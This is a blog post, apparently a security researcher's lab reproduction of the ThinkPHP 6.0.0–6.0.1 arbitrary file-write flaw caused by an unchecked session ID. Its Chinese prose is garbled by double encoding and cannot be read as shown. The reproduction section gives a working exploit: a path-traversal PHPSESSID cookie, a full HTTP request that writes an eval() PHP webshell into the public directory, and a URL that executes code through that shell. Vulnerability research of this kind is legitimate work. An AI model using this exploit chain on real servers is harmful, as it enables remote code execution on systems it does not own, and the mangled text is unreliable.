---
layout:	post
title:	"ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´"
date:	2020-03-13 15:13:21 +0800
tags:	ThinkPHP æ¼æ´å¤ç°
color:	rgb(255,210,32)
cover:	'../assets/blog_pic/20200313_thinkphp6.0/ID-INVADED.png'
subtitle:	'Ubuntu+PHP7.1+ThinkPHP6.0.0å¤ç°ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´'
---



ğŸ‘»2020å¹´1æœˆ10æ—¥ï¼ŒThinkPHPå›¢é˜Ÿå‘å¸ƒä¸€ä¸ªè¡¥ä¸æ›´æ–°ï¼Œä¿®å¤äº†ä¸€å¤„ç”±ä¸å®‰å…¨çš„SessionIdå¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ã€‚è¯¥æ¼æ´å…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç¯å¢ƒå¯ç”¨sessionçš„æ¡ä»¶ä¸‹åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è¿˜å¯ä»¥getshell

å…·ä½“å—å½±å“ç‰ˆæœ¬ä¸ºThinkPHP6.0.0-6.0.1

ğŸ‘»æœ€æ—©æ˜¯çœ‹åˆ«äººå†™äº†å¦‚ä½•å¤ç°çš„ï¼Œç„¶åè¿™å‡ å¤©æ­å»ºUbuntu+PHP7.1+ThinkPHP6.0.0å¹¶å¤ç°è¿™ä¸ªä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´

ä¸»è¦å½’çº³ä¸ºè¿½è¸ªSessionIdæ€ä¹ˆå°±å¯ä»¥ç¯¡æ”¹å•¦

åœ¨ä»€ä¹ˆç‰¹å®šæƒ…å†µä¸‹å¯ä»¥getshellå•¦



## ç¯å¢ƒå‡†å¤‡

- PHP7.1

  ```
  $ sudo apt-get -y install php7.1
  ```

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png)

- [ThinkPHP6](https://www.kancloud.cn/manual/thinkphp6_0/1037481 )

  å®‰è£…`Composer`

  ```
  $ curl -sS https://getcomposer.org/installer | php
  ```

  å¦‚æœæœ‰ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿé”™è¯¯ï¼Œå¯ä»¥è¯•ä¸€è¯•

  ```
  $ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
  ```

  ç„¶åç§»åŠ¨

  ```
  $ mv composer.phar /usr/local/bin/composer
  ```

  ä¿®æ”¹æºä¸ºé˜¿é‡Œæº

  ```
  $ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
  ```

  å®‰è£…ThinkPHP6.0

  ğŸ’¢å‘ï¼šè¿™é‡Œä¸éœ€è¦å†™`topthink/think=6.0.0dev`ï¼Œä¸ç„¶ä¼šå¤±è´¥ï¼Œç‰ˆæœ¬å¯ä»¥åœ¨å®‰è£…å®Œä¹‹åä¿®æ”¹é…ç½®æ–‡ä»¶è¿›è¡Œç‰ˆæœ¬è¦†ç›–

  ```
  $ composer create-project topthink/think=6.0.x-dev tp
  ```

  ğŸ’¢å‘ï¼š

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png)

  è›¤ï¼ŸğŸ™„æä¸æ˜ç™½ï¼Œè¿˜æ”¹äº†åŠå¤©phpçš„é…ç½®æ–‡ä»¶ï¼ŒæŠŠextension=php_fileinfo.dllçš„å‹¾æ‰ï¼Œå…¶å®ä¸éœ€è¦ï¼Œ[å‚è€ƒè¿™ç¯‡æ–‡ç« ](https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)ï¼Œå¢åŠ `--ignore-platform-reqs`

  ```
  $ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
  ```
  
  å°±å¥½æƒ¹ğŸ˜
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png)
  
  cdè¿›å…¥å®‰è£…å¥½çš„tp
  
  ```
  $ php think run
  ```
  
  è®¿é—®http://localhost:8000/ï¼Œæ­¤æ—¶æ˜¯æœ€æ–°çš„6.0.2ç‰ˆæœ¬
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png)
  
  ä¿®æ”¹ä¸º6.0.1ç‰ˆæœ¬ï¼Œå°†`/app/composer.json:24`ä¿®æ”¹ä¸º

  ```
  "topthink/framework": "6.0.0",
  ```
  
  ç„¶åæ‰§è¡Œå°†ç‰ˆæœ¬è¦†ç›–ä¸º6.0.0
  
  ```
  $ composer update
  ```
  
  å†æ¬¡
  
  ```
  $ php think run
  ```
  
  http://localhost:8000/å°±ä¼šæ˜¯6.0.0ç‰ˆæœ¬äº†
  
  

## æ´æï¼ˆæ¼æ´åˆ†æï¼‰

å‚è€ƒï¼š

[ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ](https://hacpai.com/article/1579965339516)

[ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ](https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw)

ğŸ˜’å’‹ä¸¤ç¯‡åå­—ä¸€æ ·

- å®˜æ–¹ä¿¡æ¯ï¼šThinkPHP å‘å¸ƒçš„è¡¥ä¸å£°ç§°ä¿®å¤äº†ä¸€å¤„ç”±äºä¸å®‰å…¨çš„ SessionId å¯¼è‡´çš„ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ï¼šåœ¨å¼€å¯ Session çš„æƒ…å†µä¸‹å¯ä»¥å¯¼è‡´åˆ›å»ºä»»æ„æ–‡ä»¶ä»¥åŠåˆ é™¤ä»»æ„æ–‡ä»¶ï¼Œç‰¹å®šæƒ…å†µä¸‹å¯ä»¥ getshellã€‚

- æ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬åˆ°å®˜æ–¹ GitHub çš„ commit é¡µé¢æ‰¾ä¸€ä¸‹ç›¸å…³çš„æäº¤è®°å½•ï¼š

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png)

  åœ¨src/think/session/Store.php ä¸­ 212 è¡Œåœ¨è®¾ç½® `id` æ—¶å¢åŠ äº†ä¸€ä¸ªå‡½æ•°ï¼š`ctype_alnum($text)`ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯åˆ¤æ–­æ‰€æœ‰çš„å­—ç¬¦å…¨éƒ¨æ˜¯å­—æ¯å’Œ(æˆ–è€…)æ•°å­—ï¼Œè¿”å› TRUE å¦åˆ™è¿”å› FALSEï¼Œæ‰€ä»¥å¯èƒ½æ˜¯å­˜å‚¨ Session æ—¶å¯¼è‡´çš„æ–‡ä»¶å†™å…¥

- è·Ÿè¿›æ‰¾ä¸€ä¸‹ç›¸å…³çš„å‡½æ•°

  å¯ä»¥çœ‹åˆ° `vendor/topthink/framework/src/think/session/Store.php:254` çš„ save()å‡½æ•°

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png)

  263è¡Œwriteå†™å…¥sessionIdï¼Œ265è¡Œdeleteåˆ é™¤sessionIdï¼Œç»§ç»­è·Ÿè¿›writeå‡½æ•°ï¼Œåœ¨`vendor/topthink/framework/src/think/session/driver/File.php:210`

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png)

  ä»`$sessID`æ¥`getFileName`ï¼Œç„¶åç›´æ¥`writeFile`å†™å…¥ï¼Œç»§ç»­è¿½è¸ª`writeFile`å‡½æ•°ï¼Œè¿˜æ˜¯åœ¨File.phpä¸‹

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png)

  å¯ä»¥çœ‹åˆ°è°ƒç”¨äº† `file_put_contents()` å‡½æ•°ï¼Œè¿™é‡Œæ˜¯çœŸæ­£å†™å…¥æ–‡ä»¶çš„æ“ä½œäº†

  ```
  file_put_contents($path, $content, LOCK_EX);
  ```

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png)

  å¦‚æœæ–‡ä»¶åä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼Œå¦åˆ™ç°æœ‰æ–‡ä»¶å°†è¢«è¦†ç›–ï¼Œé™¤éè®¾ç½®äº†FILE_APPENDæ ‡å¿—ã€‚

- åˆ†æï¼š

  - å‡½æ•° `file_put_contents($path,$content,LOCK_EX)` ä¸­å‚æ•° `$path,$content` æ¥æºäºå‡½æ•° `writeFile($path,$data)`

  - å‡½æ•° `writeFile($path,$data)` ä¸­å‚æ•° `$path,$data` æ¥æºäºå‡½æ•° `write(String $sessionID,String $sessiData)`

  - å‡½æ•° `write(String $sessionID,String $sessiData)` ä¸­å‚æ•° `$sessionID,$sessiData` æ¥æºäº `save()` ä¸­è°ƒç”¨äº† `write()`ï¼ŒåŒæ—¶ä¼ å…¥çš„å‚æ•° `$sessionId` çš„å€¼æ˜¯è°ƒç”¨ `getId()` ä¼ å…¥çš„

  ç»¼ä¸Šï¼Œæ–‡ä»¶åæ¥æºäº `$sessionId`ï¼Œå½“ä¼ å…¥çš„ id å€¼é•¿åº¦ä¸º 32 ï¼Œåˆ›å»º `sessionId`ï¼Œç„¶åè¿›è¡Œ `gitId()`ï¼Œå°±æ˜¯è¿™é‡Œåˆ¤æ–­ä¸è¶³

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/session32.png)

- æ¥ä¸‹æ¥æ‰¾è°ƒç”¨ `setId()` çš„åœ°æ–¹`vendor/topthink/framework/src/think/middleware/SessionInit.php:46`

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png)
  
  å…¶ä¸­ `cookieName` çš„å€¼ä¸º `PHPSESSID`ï¼Œ `$sessionId` æ˜¯ `cookie` ä¸­åä¸º `PHPSESSID` çš„å€¼ï¼Œå› æ­¤æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œä»è€Œå¯¼è‡´å†™å…¥çš„æ–‡ä»¶åå¯æ§ã€‚
  
  ä½†æ˜¯é»˜è®¤ç¯å¢ƒä¸‹ï¼Œ`session` çš„å†…å®¹ç”± `vendor/topthink/framework/src/think/session/Store.php:261` çš„å˜é‡ `$data` ä¼ å…¥ï¼š
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png)
  
  `$data` åœ¨é»˜è®¤ç¯å¢ƒä¸­ä¸ºç©º:
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png)
  
  æ‰€ä»¥ï¼Œå¯åˆ©ç”¨çš„æ¡ä»¶æ¯”è¾ƒè‹›åˆ»
  

  ğŸ‘¹ä¸€æ˜¯é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸å¼€å¯sessionçš„ï¼Œå¼€å¯sessionæ‰å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶æ“ä½œ

  ğŸ‘¹äºŒæ˜¯å†™å…¥çš„ sessionå†…å®¹æ˜¯ç”±å®é™…çš„åç«¯ä¸šåŠ¡é€»è¾‘æ¥å†³å®šï¼Œåªæœ‰ç‰¹å®šæƒ…å†µæ‰èƒ½getshell

  é‚£æ¥ä¸‹æ¥å°±getä¸€ä¸‹shellå§

## å¤ç°æ¼æ´

- ä¿®æ”¹`app/composer/Index.php`ï¼ŒåŠ ä¸€å¥

  ```
  session('sueisok',"1");
  ```
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png)

- å¼€å¯sessionï¼Œå»æ‰`app/middleware.php:9`ä¸­çš„æ³¨é‡Š

  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/middleware.png)
  
- è®¿é—®ï¼ŒæŠ“åŒ…ï¼Œå°†`PHPSESSID`æ”¹ä¸ºç›®å½•åœ°å€
  
  ```
  Cookie: PHPSESSID=../../../../public/sueisokkk.php
  ```
  
  ğŸ’¢å‘ï¼šè¿™é‡Œçš„`PHPSESSID`ä¸€å®šè¦æ˜¯32ä½çš„
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png)
  
  `runtime/session/`ä¸‹ä¼šç”Ÿæˆçš„sessionğŸ˜€
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png)
  
- æ¥æ¶æ„æ“ä½œä¸€ä¸‹ï¼ŒæŠŠ`app/composer/Index.php`é‡Œå†™å…¥
  
  ```
  session('sueisok',$_GET["c"]);
  ```
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/getc.png)
  
  è®¿é—®ï¼ŒæŠ“åŒ…ï¼Œæ•°æ®åŒ…å†…å®¹
  
  ```
  GET /index.php?s=index/index&c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
  Host: 172.16.70.244:8000
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Cookie: PHPSESSID=../../../../public/sueisokkk.php
  Upgrade-Insecure-Requests: 1
  Cache-Control: max-age=0
  ```
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/eval.png)
  
  200ä¹‹åï¼Œåœ¨`public/`ä¸‹å†™å…¥äº†åä¸º`sueisokkk.php`çš„æ–‡ä»¶ï¼Œåœ¨æµè§ˆå™¨ä¸­è®¿é—®æ„é€ å¸¦æœ‰payloadçš„é“¾æ¥ï¼š
  
  ```
  http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
  ```
  
  å°±åœ¨`public/`ä¸‹å†™å…¥äº†åä¸º`aa.txt`å†…å®¹ä¸º`hello,world`çš„æ–‡ä»¶
  
  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png)
  

ğŸ˜‡æ­¤æ—¶çš„å¿ƒæƒ…å½·ä½›æ˜¥å¤©æ¥åˆ°

## å…¶ä»–çš„å‘

- ğŸ’¢å¦‚æœä¿®æ”¹äº†sessionä»¥åï¼Œhttp://localhost:8000è®¿é—®ä¹‹åå‡ºé”™ï¼Œå°±è¦è¯•ä¸€ä¸‹

  ```
  $ sudo php think run
  ```

- ğŸ’¢å¦‚æœ`runtime/session/`ä¸‹æ²¡æœ‰ç”Ÿæˆçš„sessionï¼Œé‚£å°±åº”è¯¥æ˜¯æ–‡ä»¶å¤¹å†™çš„æƒé™ä¸å¤Ÿï¼Œæˆ‘æ˜¯ç›´æ¥ç»™äº†777

  ```
  $ sudo chmod 777 /runtime/session/
  ```

æ‰€ä»¥èƒ½ä»»æ„å†™å…¥æ–‡ä»¶getshellçš„æ¡ä»¶è¿˜æ˜¯å¾ˆè‹›åˆ»çš„

